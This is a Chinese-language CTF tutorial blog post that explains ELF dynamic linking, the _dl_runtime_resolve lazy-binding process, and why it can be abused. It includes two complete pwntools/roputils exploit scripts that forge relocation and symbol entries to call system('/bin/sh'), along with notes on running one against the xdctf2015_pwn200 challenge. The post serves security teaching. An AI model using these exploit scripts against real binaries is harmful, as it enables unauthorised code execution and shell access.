<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword  d_tag;       <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;          <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;          <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<h3 id="动态符号表（Dynamic-Symbol-Table"><a href="#动态符号表（Dynamic-Symbol-Table" class="headerlink" title="动态符号表（Dynamic Symbol Table)"></a>动态符号表（Dynamic Symbol Table)</h3><p>动态符号表中存储了与动态链接相关的符号，而这个段的段名通常叫做“.dynsym”，而对于本模块的内部符号或者私有变量则保存在.symtab这个表，symtab保存了所有的符号，包括.dynsym中的符号。</p>
<p>使用readelf -s 文件名  则可以查看文件中的.dynsym和symtab（如下面两张图片）</p>
<p><img src="/../img/2706180-20220228094602392-459952878.png"></p>
<p><img src="/../img/2706180-20220228094611847-731147180.png"></p>
<h3 id="动态符号字符串表（Dynamic-String-Table"><a href="#动态符号字符串表（Dynamic-String-Table" class="headerlink" title="动态符号字符串表（Dynamic String Table)"></a>动态符号字符串表（Dynamic String Table)</h3><p>跟名字一样，这个表就是保存了符号名的字符串表。而这个表存在的意义是由于Dynamic Symbol Table里记录的都是固定长度的内容，因此它们没办法去描述二进制文件中的任意字符串（也就是我们的函数名称），因此就需要再创立一个表（也就是.dynstr)来存储函数名称的字符串，在.dynsym中的.st_name字段存储了一个偏移，而最后.dynstr段的首地址加上这个偏移量才能找到符号的名称。而_dl_lookup函数最后就是拿着这个符号的名称（也就是函数的名称）去动态链接库里面搜索对应的函数。</p>
<p>在IDA中可以找到这个ELF String Table</p>
<p><img src="/../img/2706180-20220228094622567-442690588.png"></p>
<h2 id="dl-runtime-resolve函数具体运行模式"><a href="#dl-runtime-resolve函数具体运行模式" class="headerlink" title="_dl_runtime_resolve函数具体运行模式"></a>_dl_runtime_resolve函数具体运行模式</h2><ol>
<li><p>首先用<code>link_map</code>（就是_dl_runtime_resolvehand的第一个参数）访问<code>.dynamic</code>，分别取出<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址</p>
</li>
<li><p><code>.rel.plt</code>+参数<code>relic_index</code>，求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></p>
</li>
<li><p><code>rel-&gt;r_info</code> &gt;&gt; <code>8</code> 作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></p>
</li>
<li><p><code>.dynstr</code> + <code>sym-&gt;st_name</code>得出符号名 字符串指针</p>
</li>
<li><p>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即<code>GOT</code>表</p>
</li>
<li><p>最后调用这个函数</p>
</li>
</ol>
<p>这里我以scanf函数的调用来演示一下（随便找个程序就可以一起做了）</p>
<p>此时即将调用scanf，我们进入内部看一下</p>
<p><img src="/../img/2706180-20220228094633543-1760861108.png"></p>
<p>发现刚进去，就要让跳到0x0804a028所指向的地址（注意这里并不是跳到0x0804a028，而是跳到0x0804a028所指向的地址），我们先看一下0x0804a028指向的哪</p>
<p><img src="/../img/2706180-20220228094641752-2061093355.png"></p>
<p>发现指向的就是下一条指令的地址，这也就顺应了延迟绑定的流程图中的步骤②</p>
<p><img src="/../img/2706180-20220228094649241-866430968.png"></p>
<p>也可以发现此时的got表中scanf的地址写的就是0x080484b6，而这并不是scanf函数的真实地址。<br><img src="/../img/2706180-20220228094656078-12744920.png"></p>
<p>然后发现push了一个0x38，此时我们还不知道这是什么，先不管它。</p>
<p>发现此时准备跳转到地址0x8048430，然后跳到0x08048430，<strong>其实此时你会注意到这个地址距离当前指令的地址是很近的（再看下延迟绑定的流程图会发现其实现在就是步骤④）</strong>，然后接下来是一个push，一个jmp，我们分别看下push和jmp的内容</p>
<p><img src="/../img/2706180-20220228094703865-691204009.png"></p>
<p>可以发现push的是一个地址，而jmp则是跳到了_dl_runtime_resolve（此时完成的是延迟绑定流程图的步骤⑥）</p>
<p><img src="/../img/2706180-20220228094710868-1046942444.png"></p>
<p><img src="/../img/2706180-20220228094718808-1062991369.png"></p>
<p>此时才发现，准备跳到_dl_runtime_resolve的时候，之前压栈的两个原来是参数，因此栈顶的这个地址0xf7ffd940就是参数link_map，而0x38则是参数reloc_index。</p>
<p><img src="/../img/2706180-20220228094727908-1299586145.png"></p>
<p>因此我们先通过link_map去找到.dynamic的地址，这里第三个地址就是.dynamic的地址，不过为什么是第三个地址，而不能是别的地址？（参考下面的解释，怎么用怎么用link_map访问到.dynamic的地址的？）<br><img src="/../img/2706180-20220228094734973-1296358547.png"></p>
<h3 id="怎么用link-map访问到-dynamic的地址的？"><a href="#怎么用link-map访问到-dynamic的地址的？" class="headerlink" title="怎么用link_map访问到.dynamic的地址的？"></a>怎么用link_map访问到.dynamic的地址的？</h3><p>link_map的源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;    <span class="comment">/* Base address shared object is loaded at.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;     <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;      <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以发现在第三个成员 *l_ld这里存储的是Dynamic段地址，因此我们去查找link_map结构体中第三个的地址就是.dynamic的地址了</p>
<p>现在要分别取出<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址了，它们处于什么位置？</p>
<p>我们先用readelf -d 看一下.dynamic段的内容</p>
<p><img src="/../img/2706180-20220228094743012-658911024.png"></p>
<p><strong>发现了.dynstr、.dynsym和rel.plt的位置，分别是位于了偏移9，偏移10，和偏移17的位置，又结合最前面提到的结构体Elf32_Dyn为8字节，并且实际的值或者指针应该处于后四字节，因此他们应该分别在dynamic段中位于8*9-4&#x3D;0x44，10*8-4&#x3D;0x4c,17*8-4&#x3D;0x84偏移处</strong>（这里要减去4字节是因为我计算的是不包括他们身处当前位置的字节，而前面计算偏移9、10、17的时候，包括了他们身处当前位置的偏移）因此这里去看下.dynamic段的内容，然后取出对应偏移的内容就是我们要找的.dynstr、dynsym、rel.plt。</p>
<p><img src="/../img/2706180-20220228094750474-266299948.png"></p>
<p>然后用rel.plt的值加上参数reloc_index，就是重定位表项Elf32_Rel的指针，即0x080483c4+0x38&#x3D;0x80483fc。</p>
<p><img src="/../img/2706180-20220228094758713-328537999.png"></p>
<p>下面是Elf32_Rel的结构，对应上图来看，因此r_offset&#x3D;0x804A028<strong>（而这个r_offset就是got.plt的地址，<font color=red>就是说最后解析之后真实的地址会填写进r_offset所指向的地方）</font></strong>,r_info&#x3D;0x907。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr   r_offset;     <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word   r_info;          <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<p>而将r_info&gt;&gt;8作为dynsym的下标，即0x907&gt;&gt;8&#x3D;9</p>
<p><img src="/../img/2706180-20220228094808547-1115623759.png"></p>
<p>此时它的地址为0x08048268，我们看下Elf32_Sym的源码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>发现在第一个成员st_name存储的就是字符串表的索引（这里我感觉理解成偏移更合适），也就是说符号表的一个内容存储的就是.dynstr距离所需要函数名称的偏移。</p>
<p>那我们看一下0x08048268地址的内容，发现了偏移是0x1a<br><img src="/../img/2706180-20220228094819076-1553870020.png"></p>
<p>因此最终的st_name的地址为.dynstr的地址加上之前拿到的.dynstr的索引，即0x080482a8+0x1a&#x3D;0x080482c2,</p>
<p>最终也是成功找到.dynstr中的scanf函数名字的存储地址。<br><img src="/../img/2706180-20220228094826126-1150418789.png"></p>
<p>接下来就会调用_dl_lookup_symbol_x函数，去动态库里进行遍历搜索，可以看见下图的第一个参数就是我们要搜索的函数名称</p>
<p><img src="/../img/2706180-20220228094834270-1905443385.png"></p>
<h2 id="倒推整个过程，增强整体的逻辑性"><a href="#倒推整个过程，增强整体的逻辑性" class="headerlink" title="倒推整个过程，增强整体的逻辑性"></a>倒推整个过程，增强整体的逻辑性</h2><p>然后上面说明的是具体的实现过程，但是彼此因果性可能不是特别强，下面我再倒推一遍，目的是为了让你知道每一步都在干什么。</p>
<p><strong>我们需要拿到我们要找的函数名字（它是个字符串，而我们要拿到这个字符串的首地址），然后把它交给_dl_lookup_symbol_x,让这个函数去动态库里面搜索，找到我们想延迟绑定的函数，然后把地址再填写到got.plt里面</strong></p>
<p>那现在唯一的问题就是我们怎么拿到这个函数的名字的字符串？<br><strong>这个字符串放在.dynstr（动态符号字符串表）了里面，那我们现在需要两个东西，<font color=red>一个是.dynstr的首地址，一个是我们所需要的字符串距离.dynstr首地址的偏移</font>，才能准确的去找到我们需要的函数名字</strong></p>
<p>那现在的问题就是这两个东西怎么找？</p>
<h3 id="①先说-dynstr的首地址"><a href="#①先说-dynstr的首地址" class="headerlink" title="①先说.dynstr的首地址"></a><strong>①先说.dynstr的首地址</strong></h3><p><strong>在.dynamic段里存储了动态链接器所需要的基本信息，而这其中就包含了.dynstr的位置</strong>，也就是说如果现在找到了.dynamic的地址，查看里面的内容即可找到.dynstr的位置<br>那现在的问题就是去找.dynamic的地址。<br>而观察了link_map的结构，<strong>发现link_map结构体中第三个内容存放的就是.dynamic的地址</strong><br>因此我们只需要去查看一下link_map的内容，然后第三个内容就是我们要找的东西了，<strong>而link_map我们是知道的，因为它就是执行_dl_runtime_resolve函数时的第一个参数link_map_obj。</strong><br>如此再推回去，就可以知道.dynstr的地址了</p>
<h3 id="②再说一下相对于-dynstr首地址的偏移怎么找"><a href="#②再说一下相对于-dynstr首地址的偏移怎么找" class="headerlink" title="②再说一下相对于.dynstr首地址的偏移怎么找"></a><strong>②再说一下相对于.dynstr首地址的偏移怎么找</strong></h3><p>通过阅读<strong>Elf32_Sym</strong>的源码，发现<strong>它这个结构体中第一个成员存储的就是我们要找的偏移</strong><br>而<strong>这个结构又存储在.dynsym（动态符号表）中</strong>（每个函数都有一个自己单独的Elf32_Sym结构）<br>因此<strong>我们可以在.dynsym中找到我们想要的Elf32_Sym结构</strong>，可是又出现了两个问题。<br><strong><font color=red>每个函数都有一个这个结构，那我们怎么去.dynsym中找到我们要找的这个函数的结构？并且.dynsym的地址怎么找？</font></strong></p>
<h4 id="先解决第二个问题"><a href="#先解决第二个问题" class="headerlink" title="先解决第二个问题"></a>先解决第二个问题</h4><p><strong>.dynsym的地址也在上面提到的.dynamic段中存储了</strong>，而上面我们已经说了怎么找.dynamic段的地址，因此这个.dynsym的地址已经被我们知道了</p>
<h4 id="然后解决第一个问题，我们怎么在-dynsym中找到我们要找的那个函数的结构？"><a href="#然后解决第一个问题，我们怎么在-dynsym中找到我们要找的那个函数的结构？" class="headerlink" title="然后解决第一个问题，我们怎么在.dynsym中找到我们要找的那个函数的结构？"></a>然后解决第一个问题，我们怎么在.dynsym中找到我们要找的那个函数的结构？</h4><p><strong>找到这个结构其实也只是需要拿到它距离.dynsym首地址的偏移即可，而这个偏移需要去找到rel.plt表</strong>，这个表是由Elf32_Rel结构体组成，而<strong>将它的第二个成员存储的内容算术右移八位，得到的数值就是我们要找的结构距离.dynsym的偏移</strong><br>现在的问题又是要去找rel.plt表，不过好在<strong>rel.plt也位于.dynamic段</strong>，**<font color=red>由于每个Elf32_Rel的结构体又都对应一个函数，因此怎么去找到我们需要的那个Elf32_Rel呢？</font>**<br>又要用到偏移，而这个偏移我们不需要找了，因为<strong>这个偏移就是_dl_runtime_resolve的第二个参数reloc_index</strong>，如此推回去，也就知道了我们需要的.dynstr首地址的偏移了。</p>
<h2 id="dl-runtime-resolve函数运作的流程图"><a href="#dl-runtime-resolve函数运作的流程图" class="headerlink" title="_dl_runtime_resolve函数运作的流程图"></a>_dl_runtime_resolve函数运作的流程图</h2><p>把上面的倒推过程画成图就是这个样子。<br><img src="/../img/2706180-20220228094846054-1801078117.png"></p>
<h1 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h1><p>通过阅读上面的所有内容，其实是可以发现，最后<strong>_dl_lookup_symbol_x</strong>函数会去搜索字符串是有问题的，因为这个函数<strong>并不在乎你给的字符串是否是你此刻在延迟绑定的函数</strong>，即使这个字符串是别的函数的名称，它依旧会去搜索，<strong>并且动态装载器并不会去检查重定位表的边界，即使你的_dl_runtime_resolve函数第二个参数是极大的，此时的偏移已经超过了rel,plt段的范围</strong>，装载器也依旧是认为这只是一个很大的rel.plt偏移，它不认为这个偏移超过了rel.plt段，最重要的就是<strong>32位程序里面，是用的栈传参，因此这就意味着_dl_runtime_resolve的第二个参数是可以被伪造的</strong>，综上所述，<font color=red>我们就可以伪造一个很大的 reloc_index,让原本偏移到rel.plt段的reloc_index偏移到我们伪造的可控内存，然后我们就可以伪造一系列的结构，最终让距离dynstr段首的偏移指向我们指定的字符串（也就是伪造了字符串），至此_dl_lookup_symbol函数就去搜索到了我们指定的函数。</font></p>
<h1 id="实战ret2dlresolve"><a href="#实战ret2dlresolve" class="headerlink" title="实战ret2dlresolve"></a>实战ret2dlresolve</h1><h2 id="手动构造exp探究原理"><a href="#手动构造exp探究原理" class="headerlink" title="手动构造exp探究原理"></a>手动构造exp探究原理</h2><p>我感觉ret2dlresolve的情况只适用于没有打印函数的程序，毕竟有了打印函数就可以直接用ret2libc了，因此这里我以只有一个read函数的题目来演示一下</p>
<p><img src="/../img/2706180-20220228094854685-707283332.png"></p>
<p><img src="/../img/2706180-20220228094901516-535707583.png"></p>
<p>发现只有一个read函数，然后存在溢出，然后就啥都没有了，没有system函数，没有参数。像这种情况就考虑ret2dlresolve的方法了。</p>
<p>接下来我直接就上exp了，详细解释都在exp里面。（里面有的要用到图片解释的地方，我有进行标注，请参考最下面的补充内容）<br>题目我上传到网盘上了 链接<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/178HKNE9slZspt7EIB81zoA?pwd=ykpa">https://pan.baidu.com/s/178HKNE9slZspt7EIB81zoA?pwd=ykpa</a>  提取码ykpa</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#先初始化一下一会要用到的段首地址，就是把每个段的首地址都给赋值给变量</span></span><br><span class="line"><span class="comment">#当然了，你要是想去ida里面一个一个手动找出来，也完全没问题</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">44</span><span class="comment">#这个偏移没啥好说的了，ida或者gdb都能得到</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x080485d8</span><span class="comment">#这里采用的是连续pop四次的gadget地址</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804854A</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span></span><br><span class="line"><span class="comment">#这个base_addr是我们要把栈迁移的地方，用gdb发现这一部分是可写的</span></span><br><span class="line"><span class="comment">#因此我们选择迁移到这里（具体参考补充①）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span><span class="comment">#这个fake_sym_addr是Elf32_Sym结构的首地址</span></span><br><span class="line"><span class="comment">#原本是要把伪造的ELf32_Sym结构写在偏移32的位置的，但是还要对齐，因此下面还要再加align</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)<span class="comment">#Elf32_Sym结构是16字节，因此地址也需要和16字节对齐，二者地址相减</span></span><br><span class="line"><span class="comment">#然后只取最后一位，就可以理解成二者的地址是放在了一个结构里面</span></span><br><span class="line"><span class="comment">#（因为只考虑最后一位的话范围只是在16字节以内（但其实不是这样的，不过可以理解成这样，画个图就懂了）</span></span><br><span class="line"><span class="comment">#然后最后的值被0x10所减，求的就是fake_sym_addr距离16个字节所补齐差的字节数</span></span><br><span class="line"><span class="comment">#至于为什么减的是dynsym，淦，因为dynsym一定是被对齐了的，因此它需要找一个对齐的表来做参考啊</span></span><br><span class="line">fake_sym_addr+=align<span class="comment">#最后再加上这个为了补齐的字节才是最后我们要构造的fake_sym的地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#这个st_name就是dynstr段首地址距离目标函数名称的偏移</span></span><br><span class="line"><span class="comment">#我们把最终的system函数名称布置到了fake_sym_addr+0x10的位置，为啥加0x10?</span></span><br><span class="line"><span class="comment">#因为system上面还有一个Elf32_Sym的结构，这个结构大小为16字节</span></span><br><span class="line">st_info=<span class="number">12</span><span class="comment">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type（不过我感觉没必要区分，直接加起来就行）</span></span><br><span class="line"><span class="comment">#另外就是这个12是可以在IDA里面通过dynsym来查到（具体参考补充②）</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)<span class="comment">#这个就是伪造的Elf32_Sym结构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#这个是ret.plt结构中的第一个成员，也就是解析之后的真实地址写入的地方</span></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span><span class="comment">#这个我不是太确定，我感觉除0x10是因为Elf32_Sym的大小是16字节</span></span><br><span class="line"><span class="comment"># 这个偏移应该是以一个结构（16字节）为单位的</span></span><br><span class="line">r_type=<span class="number">0x7</span><span class="comment">#这个0x7是重定位的一种类型，指的是导入函数，进入_dl_fixup函数里面，还会检查这是不是0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type&amp;<span class="number">0xf</span>)<span class="comment">#这里&lt;&lt;8是因为，最后还要再&gt;&gt;8，从而保持正常，而&amp;0xf，其实没用，不写也行</span></span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span><span class="comment">#从rel.plt到base_addr+24的偏移也就是执行_dl_runtime_resolve的第二个参数</span></span><br><span class="line"><span class="comment">#而加24的原因是，我们将rel.plt结构布置在了距离base_addr偏移24的位置</span></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#这里就是伪造的rel.plt结构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) <span class="comment">#劫持执行流，让程序再执行一次read，将我们想要伪造的内容存入我们指定的地方</span></span><br><span class="line">payload1+=p32(four_pop_ret) <span class="comment">#这里需要用连续四个pop把栈顶的内容给从栈顶清空，不然ret的时候就会出现问题</span></span><br><span class="line"><span class="comment">#这里采用四个pop的原因是因为如果采用三个pop的话，第三个pop是弹给了ebp，这样迁移的话就会出现问题，</span></span><br><span class="line"><span class="comment">#因此我用了四个pop前三个清空栈顶的参数，后一个pop去改变ebp的值，为了正常的完成栈迁移</span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span><span class="comment">#这里如果用base_addr的时候，会出现问题，调试的时候发现dl_fixup的时候发现</span></span><br><span class="line"><span class="comment">#里面push了一个ecx，（这个ecx）被用来当做dl_fixup的参数（link_map)，这个ecx就是我们第二次输入的首地址</span></span><br><span class="line"><span class="comment">#如果首地址里面装了4个a的话，就会出现错误（因为参数link_map怎么能是4个a呢），通过调试发现，link_map本身正常的</span></span><br><span class="line"><span class="comment">#参数就是push了ds:0x0804a004(此时的栈已经迁移过了，调试发现压到的这个栈顶居然就是0x0804a800），因此为了让dl_fixup拿到</span></span><br><span class="line"><span class="comment">#这个正常的参数，我们就要让ecx是0x0804a800，而怎么让这个ecx变成0x0804a800，我们只能是read输入的第二个参数</span></span><br><span class="line"><span class="comment">#设置成0x0804a800才可以，而我们迁移之后还想让0x0804a800这里的数据是正常的，那就只能迁移到的地址调高0x4个字节，这样</span></span><br><span class="line"><span class="comment">#迁移过来的时候，栈顶（也就是0x0804a800）依然是正常的link_map</span></span><br><span class="line"><span class="comment">#（如果不太理解我说的是什么意思的话，自己可以把base_addr-4改成base_addr用gdb调试一下就知道了）</span></span><br><span class="line">payload1+=p32(leave_ret_addr)<span class="comment">#如果不知道这里为什么要用leave_ret_addr的话</span></span><br><span class="line"><span class="comment">#建议再学习一下栈迁移，我的博客上有一篇详细介绍了栈迁移的文章</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#payload2=&#x27;aaaa&#x27;#上面采用了抬高0x4字节，因此这里不用再填充垃圾数据了，以便让dl_fixup正常执行</span></span><br><span class="line">payload2=p32(plt0)<span class="comment">#这个plt0和下面的reloc_index，他们共同组成了read_plt（具体参考下面的补充③）</span></span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#这四个b就是返回地址</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#这个放置的是system的参数的位置，也就是/bin/sh的位置</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#由于read的参数是三个，而system的参数只用了第一个，因此另外两个参数需要填充一下垃圾数据</span></span><br><span class="line">payload2+=fake_rel_plt<span class="comment">#开始放置伪造的rel.plt表</span></span><br><span class="line">payload2+=align*<span class="string">&#x27;a&#x27;</span><span class="comment">#保证fake_sym是对齐了16字节</span></span><br><span class="line">payload2+=fake_sym<span class="comment">#伪造的Elf32_Sym结构</span></span><br><span class="line">payload2+=<span class="string">&#x27;system\x00&#x27;</span><span class="comment">#最终伪造的字符串，让dl_lookup_symbol_x去搜索这个字符串</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span><span class="comment">#因为上面提到了会把参数放在偏移80的位置，因此这里填充\x00到偏移80这里</span></span><br><span class="line">payload2+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">100</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>补充①</p>
<p><img src="/../img/2706180-20220228094915257-286002672.png"></p>
<p>补充②</p>
<p><img src="/../img/2706180-20220228094921502-932826454.png"></p>
<p>补充③</p>
<p><img src="/../img/2706180-20220228094929697-1836063513.png"></p>
<p>payload2&#x3D;p32(plt0)<br>payload2+&#x3D;p32(reloc_index)</p>
<p>这两步对应的就是图中标注的两步，这也就是plt在干的事情（因此你可以把这两步等同于p32(read_plt_addr)）</p>
<h2 id="工具攻击"><a href="#工具攻击" class="headerlink" title="工具攻击"></a>工具攻击</h2><p>另外也可以采用Roputil工具，进行攻击，这个工具的威力是很大的，我们根本不需要改什么东西，只要换个偏移和程序名，然后就一把梭了。工具在此下载<a target="_blank" rel="noopener" href="https://github.com/inaz2/roputils">https://github.com/inaz2/roputils</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)<span class="comment">#这个rop，就可以理解成elf，这里就是获取了bss段首地址</span></span><br><span class="line">buf = rop.fill(offset)<span class="comment">#填充垃圾数据</span></span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)<span class="comment">#添加一个调用，调用了read函数，后面是它的参数</span></span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)<span class="comment">#第一个参数为伪造的link_map，第二个则是被劫持调用</span></span><br><span class="line"><span class="comment">#函数的参数（system），也就是/bin/sh的位置</span></span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#先存入/bin/sh字符串，使其位于bss_base的位置</span></span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)<span class="comment">#填充垃圾数据</span></span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment">#第一个参数是伪造的link_map首地址（就是system函数名放的位置），第二个参数是要伪造的函数名</span></span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)<span class="comment">#填充垃圾数据</span></span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="BUUCTF上的xdctf2015-pwn200"><a href="#BUUCTF上的xdctf2015-pwn200" class="headerlink" title="BUUCTF上的xdctf2015_pwn200"></a>BUUCTF上的xdctf2015_pwn200</h2><p><img src="/../img/2706180-20220228175843037-1667392941.png"></p>
<p><img src="/../img/2706180-20220228175854393-1488686373.png"></p>
<p>在以这道题为例看一下Roputil的威力（不过这道题实在有点杀鸡用牛刀了，因为存在泄露函数，直接用ret2libc也可以）</p>
<p>我只是拿上面的exp改了一下偏移和远程题目的地址（需要注意的是由于刚开始直接从Roputils里面引入了所有的函数，因此我们要用原本pwntools中的函数时，需要再引用一下）<strong>这里还把上面那个exp中的from pwn import process换成了from pwn import remote</strong>，最后直接一把梭。</p>
